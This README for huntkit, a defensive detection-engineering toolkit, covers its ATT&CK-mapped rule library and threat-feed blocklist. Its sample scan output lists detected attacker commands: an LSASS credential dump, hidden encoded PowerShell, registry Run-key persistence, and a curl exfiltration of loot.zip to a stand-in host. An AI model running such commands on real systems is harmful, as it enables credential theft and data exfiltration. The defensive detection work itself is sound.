<div align="center">

# huntkit

**The detection-engineering kit — one command, ten tools, a rule library, and a live blocklist.** Extract IOCs, run YARA and Sigma, validate Elastic rules, map findings to MITRE ATT&CK, run a single-file SIEM — plus a bundled, ATT&CK-mapped **detection-rule library** and a **known-bad blocklist** that refreshes from live threat feeds. All offline, zero dependencies.

[![PyPI](https://img.shields.io/pypi/v/cognis-huntkit.svg)](https://pypi.org/project/cognis-huntkit/)
[![CI](https://github.com/cognis-digital/huntkit/actions/workflows/ci.yml/badge.svg)](https://github.com/cognis-digital/huntkit/actions)
[![License: COCL 1.0](https://img.shields.io/badge/license-COCL%201.0-blue.svg)](LICENSE)
![Modules](https://img.shields.io/badge/modules-10-informational)
![Rules](https://img.shields.io/badge/detection%20rules-30%2B-informational)
![Deps](https://img.shields.io/badge/runtime%20deps-none%20(stdlib)-success)

</div>

Detection engineers juggle a dozen half-overlapping scripts — one to defang IOCs, one to run YARA, one to lint Sigma, one to map ATT&CK. `huntkit` puts them behind one command, and ships the two things those scripts always lack: **a real, ATT&CK-mapped rule library** and **a blocklist that stays fresh**.

```bash
pip install cognis-huntkit
huntkit rules scan /var/log/auth.log     # detect attacker TTPs in your logs
huntkit block update                      # pull the latest C2 / botnet / Tor indicators
```

## See it work

Run the bundled detection rules over a suspicious command log — every hit is mapped to a MITRE ATT&CK technique:

```console
$ huntkit rules scan suspicious_commands.log
suspicious_commands.log
  [CRIT] L4    CRD001  T1003.001  LSASS dump
           > procdump.exe -ma lsass.exe lsass.dmp
  [HIGH] L1    EXE001  T1059.001  Encoded PowerShell command
           > powershell -nop -w hidden -enc SQBFAFgA...
  [HIGH] L7    PER001  T1547.001  Registry Run-key persistence
           > reg add HKCU\...\CurrentVersion\Run /v x /d evil.exe
  [HIGH] L9    EXF001  T1048      Data POST to external host
           > curl -X POST --data @loot.zip https://evil.example/upload

4 detection(s).
```

Check an IP against the live-refreshable blocklist:

```console
$ huntkit block match 102.130.117.167
BLOCKED: 102.130.117.167
$ huntkit block stats
huntkit blocklist: 1376 indicators loaded   # Feodo C2 + SSLBL + Tor exit — refresh with `block update`
```

## Ten tools, one command

| Module | Command | What it does |
|---|---|---|
| **rules** | `huntkit rules` | Bundled ATT&CK-mapped detection-rule library — list, scan, stats |
| **block** | `huntkit block` | Known-bad blocklist — match / update from abuse.ch + Tor feeds |
| ioc | `huntkit ioc` | Extract & defang IOCs (IPs/domains/hashes/URLs) from any text |
| rep | `huntkit rep` | Score IOCs against offline reputation / allow-lists |
| stix | `huntkit stix` | Build STIX 2.1 bundles from observables |
| yara | `huntkit yara` | Run YARA-style rules over files and directories |
| yaragen | `huntkit yaragen` | Generate candidate YARA rules from sample files |
| sigma | `huntkit sigma` | Lint & unit-test Sigma detection rules |
| elastic | `huntkit elastic` | Validate, diff & deploy Elastic detection rules |
| siem | `huntkit siem` | Single-file SIEM: run Sigma over logs, timeline & alert |
| attack | `huntkit attack` | Map findings to MITRE ATT&CK techniques + coverage |

Each module is also its own console command (`iocextract`, `yararun`, …) so existing scripts keep working. Run `huntkit <module> --help` for any of them.

## The rule library

30+ explicit detection rules across **execution / defense-evasion**, **persistence / privilege-escalation**, and **credential-access / discovery / exfiltration** — each a real, named attacker technique with a severity and a MITRE ATT&CK ID, in plain JSON under [`huntkit/rules/`](huntkit/rules). Adding one is a few lines; see [CONTRIBUTING.md](CONTRIBUTING.md). It grows like a community ruleset — bring a TTP you've seen to [Discussions](https://github.com/cognis-digital/huntkit/discussions).

## The blocklist

Ships a snapshot of C2 / botnet / Tor-exit indicators and refreshes from **free, keyless, redistributable feeds** — abuse.ch [Feodo Tracker](https://feodotracker.abuse.ch/) + [SSL Blacklist](https://sslbl.abuse.ch/) and the [Tor exit list](https://check.torproject.org/). `huntkit block update` pulls the latest; everything is cached and served offline.

## Why huntkit

- **One tool, not twelve.** The detection-engineering workflow — IOCs → rules → ATT&CK mapping → SIEM — behind a single command.
- **Content, not just an engine.** The bundled rule library and blocklist are the part that's usually missing; here they ship in the box and stay fresh.
- **Offline & zero-dep.** Pure stdlib. Runs on an air-gapped analyst box; no data leaves it.
- **CI-ready.** Non-zero exit on critical/high detections.

## Install

```bash
pip install cognis-huntkit    # everything: 10 modules + rule library + blocklist
```

Python 3.10+. Windows / macOS / Linux.

## Defensive use

huntkit is defensive tooling for logs and artifacts **you are authorized to analyze**. It reads and detects; it does not attack.

## License

[COCL 1.0](LICENSE). See [DISCLAIMER.md](DISCLAIMER.md).

<div align="center"><sub>Part of the <a href="https://github.com/cognis-digital">Cognis</a> security tooling · pairs with <a href="https://github.com/cognis-digital/c2detect">c2detect</a> (C2 fingerprinting) and <a href="https://github.com/cognis-digital/shrike">shrike</a> (AI-stack security).</sub></div>
